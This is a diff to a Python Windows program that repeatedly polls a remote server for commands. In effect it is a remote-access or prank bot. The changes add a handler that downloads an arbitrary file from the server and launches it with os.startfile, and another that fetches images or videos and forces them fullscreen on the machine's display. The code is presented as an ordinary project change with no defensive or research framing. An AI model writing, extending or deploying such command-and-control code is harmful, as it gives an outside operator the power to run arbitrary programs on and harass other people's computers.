@@ -7,20 +7,21 @@ import os
 import pyttsx3
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
-from win32 import win32gui
-
+import cv2
 url = "https://ms32-sha2.onrender.com/"
 terminate = False
 HWND = 0
 SW_HIDE = 0
 SW_SHOW = 5
-
+#compile left
 try:
     pygame.mixer.init()
 except:
     pass
 if not os.path.exists("effects"):
     os.mkdir("effects")
+if not os.path.exists("assets"):
+    os.mkdir("assets")
 def hit(url:str):
     try:
         if not terminate:
@@ -120,18 +121,68 @@ def restart():
     terminate = True
 
 def run(name):
-    exe = hit(url+f"static/updates/apps/{name}.exe")
-    with open(f"{name}.exe", "xb") as file:
+    exe = hit(url+f"static/apps/{name}")
+    with open(f"{name}", "xb") as file:
         downloaded_size = 0
         for chunk in exe.iter_content(chunk_size=8192):
             if chunk:
                 file.write(chunk)
                 downloaded_size += len(chunk)
-    os.startfile(f"{name}.exe")
+    os.startfile(name)
+
+def display(fp):
+    asset = hit(url+f"static/images/{fp}")
+    try:
+        with open(f"assets/{fp}", "xb") as file:
+            downloaded_size = 0
+            for chunk in asset.iter_content(chunk_size=8192):
+                if chunk:
+                    file.write(chunk)
+                    downloaded_size += len(chunk)
+    except FileExistsError:pass
+    file_path = f"assets/{fp}"
+    cv2.namedWindow("Gok GOk", cv2.WND_PROP_FULLSCREEN)
+    cv2.setWindowProperty("Gok GOk", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+    
+    if file_path.lower().endswith(('.mp4', '.avi', '.mov', '.mkv')):
+        video_capture = cv2.VideoCapture(file_path)
+        if not video_capture.isOpened():
+            return
+        fps = video_capture.get(cv2.CAP_PROP_FPS)
+        if fps == 0:
+            fps = 30
+        frame_delay = int(530 / fps)
+        while True:
+            ret, frame = video_capture.read()
+            if not ret:
+                break
+            screen_width = cv2.getWindowImageRect("Gok GOk")[2]
+            screen_height = cv2.getWindowImageRect("Gok GOk")[3]
+            frame = cv2.resize(frame, (screen_width, screen_height))
+            cv2.imshow("Gok GOk", frame)
+            cv2.waitKey(frame_delay)
+        video_capture.release()
+        sleep(1.5)
+    elif file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp')):
+        image = cv2.imread(file_path)
+        if image is None:
+            return
+
+        screen_width = cv2.getWindowImageRect("Gok GOk")[2]
+        screen_height = cv2.getWindowImageRect("Gok GOk")[3]
+        image = cv2.resize(image, (screen_width, screen_height))
+
+        cv2.imshow("Gok GOk", image)
+
+        cv2.waitKey(1)
+        sleep(8)
+    else:
+        pass
+    cv2.destroyAllWindows()
 
 def main():
     while not terminate:
-        sleep(0.8)
+        sleep(0.5)
         cmd = hit(url+"command")
         if type(cmd) != str:
             cmd = cmd.content.decode("utf-8")
@@ -156,6 +207,9 @@ def main():
             update()
         elif "rUn" in cmd:
             app_name = cmd.replace("rUn ","")
-            run(app_name)
+            Thread(target=run,args=(app_name,)).start()
+        elif "iMaGe" in cmd:
+            ifp = cmd.replace("iMaGe ","")
+            Thread(target=display,args=(ifp,)).start()
 
 main()
